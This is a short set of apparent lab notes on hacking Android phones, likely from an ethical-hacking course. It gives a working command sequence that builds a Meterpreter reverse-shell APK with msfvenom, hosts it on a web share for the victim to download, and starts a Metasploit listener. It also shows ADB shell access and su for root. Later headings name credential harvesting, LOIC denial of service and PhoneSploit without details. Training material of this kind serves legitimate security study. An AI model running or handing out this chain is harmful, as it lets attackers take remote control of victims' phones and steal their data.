# Hacking Mobile Applications

## Hack android devices

### Hack an Android device by creating binary payloads using Parrot Security

Generating a payload for android device
```
service postgresql start
service apache2 start
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=AttackerIP R > DestinationPath/name.apk
```
To share this malicious file locally
```
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
```
Copy the malcious file into the share directory
```
cp source /var/www/html/share
```
Creating a reverse handler to listen on
```
msfconsole
use /exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost deviceip
set lport 4444
exploit -j -z
```
Goto Android Device
Open Google
http://attacker'sip/share
open and download the payload

Alternatively Exploit the freeciv service running on androi ddevice by
```
adb conect ip:port
adb shell
```
To gain root privileges
```
su
```
https://github.com/jaykali/ghost

### Harvest Users’ Credentials using the Social-Engineer Toolkit
### Launch a DoS attack on a target machine using Low Orbital Cannon (LOIC) on the Android mobile platform
### Exploit the Android platform through ADB using PhoneSploit

## Secure Android Devices using Various Android Security Tools

### Analyze a malicious app using online Android analyzers
### Analyze a malicious app using Quixxi vulnerability scanner
### Secure Android devices from malicious apps using Malwarebytes Security
